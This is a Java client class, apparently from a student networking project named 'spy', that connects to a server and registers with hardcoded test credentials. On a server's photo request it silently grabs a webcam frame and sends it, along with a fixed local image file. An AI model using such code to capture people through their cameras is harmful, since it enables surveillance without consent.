package pl.edu.pw.elka.tin.spy.client.application;

import lombok.extern.slf4j.Slf4j;
import org.bytedeco.javacv.*;
import pl.edu.pw.elka.tin.spy.client.domain.protocol.Header;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

@Slf4j
public class ServerConnection implements Runnable{

	private Socket taskSocket;

	static final String SEPARATOR = ":";

	private ThreadPoolExecutor poolExecutor;

	private final Queue<byte[]> queue = new ConcurrentLinkedQueue<>();

	public ServerConnection(String serverUrl, int serverPort){
		poolExecutor = new ThreadPoolExecutor(30, Integer.MAX_VALUE, 60, TimeUnit.SECONDS, new SynchronousQueue<>());

		try {
			taskSocket = new Socket(serverUrl,serverPort);
		} catch (IOException e) {
			log.debug("Couldn't connect to a server: " + serverUrl);
		}

		poolExecutor.submit(new ReaderThread(taskSocket, queue));
		poolExecutor.submit(new WriterThread(taskSocket,queue));
	}

	@Override
	public void run() {

		try {
			DataInputStream dIn = new DataInputStream(taskSocket.getInputStream());

			// use register, login needs id
			register("test", "test");
			// client should fetch userID
			// client.login(userID, "test2");

			while (true) {
				int length = dIn.readInt();
				byte[] header = new byte[length];
				dIn.readFully(header, 0, length);
				String result = new String(header, StandardCharsets.UTF_8);
				log.debug("Get new message from: " + taskSocket.getRemoteSocketAddress().toString());
				if (result.equals(Header.PHOTO_REQUEST.toString())) {
					Thread.sleep(2000);
					log.info("Get SPH message, sending photo to server");
					sendPhoto();
					sendImage("C:\\Users\\PC-Martyna\\IdeaProjects\\spyclient\\src\\main\\resources\\kupa.jpg");
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} finally {
			try {
				taskSocket.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	private void sendPhoto(){
		OpenCVFrameGrabber grabber = new OpenCVFrameGrabber(0);
		OpenCVFrameConverter.ToIplImage converter = new OpenCVFrameConverter.ToIplImage();

		try {
			grabber.start();
			Frame frame = grabber.grab();

			BufferedImage img = new Java2DFrameConverter().convert(frame);
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			ImageIO.write(img, "jpg", baos);
			baos.flush();
			byte[] image = baos.toByteArray();
			baos.close();

			DataOutputStream dos = new DataOutputStream(taskSocket.getOutputStream());
			dos.writeInt(image.length + 3);
			dos.write(Header.PHOTO.getValue().getBytes(StandardCharsets.UTF_8));
			dos.write(image);
			dos.flush();
		} catch (FrameGrabber.Exception e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}


	}

	File loadImage(String path) {
		return new File(path);
	}

	void sendImage(String path) {
		try {
			File file = this.loadImage(path);
			byte[] fileContent = Files.readAllBytes(file.toPath());
			DataOutputStream dos = new DataOutputStream(taskSocket.getOutputStream());
			dos.writeInt(fileContent.length + 3);
			dos.write(Header.PHOTO.getValue().getBytes(StandardCharsets.UTF_8));
			dos.write(fileContent);
			dos.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	void register(String login, String password) {
		try {
			DataOutputStream dos = new DataOutputStream(taskSocket.getOutputStream());
			// we are adding 2 ints (because we are sending 2 fields except header - login and password), so we have to extend our message by 2 * 4
			dos.writeInt(3 + login.getBytes(StandardCharsets.UTF_8).length + password.getBytes(StandardCharsets.UTF_8).length + 2 * 4);
			dos.write(Header.REGISTRATION_REQUEST.getValue().getBytes(StandardCharsets.UTF_8));
			// before every field we have to add its length, otherwise parser could not read that
			dos.writeInt(login.getBytes(StandardCharsets.UTF_8).length);
			dos.write(login.getBytes(StandardCharsets.UTF_8));
			// before every field we have to add its length, otherwise parser could not read that
			dos.writeInt(password.getBytes(StandardCharsets.UTF_8).length);
			dos.write(password.getBytes(StandardCharsets.UTF_8));
			dos.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	void login(int login, String password) {
		try {
			DataOutputStream dos = new DataOutputStream(taskSocket.getOutputStream());
			// we are adding 2 ints (because we are sending 2 fields except header - login and password), so we have to extend our message by 2 * 4
			dos.writeInt(3 + 4 + password.getBytes(StandardCharsets.UTF_8).length + 4);
			dos.write(Header.AUTHENTICATION_REQUEST.getValue().getBytes(StandardCharsets.UTF_8));
			// int field does not have length field
			dos.writeInt(login);
			// before every field we have to add its length, otherwise parser could not read that
			dos.writeInt(password.getBytes(StandardCharsets.UTF_8).length);
			dos.write(password.getBytes(StandardCharsets.UTF_8));
			dos.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
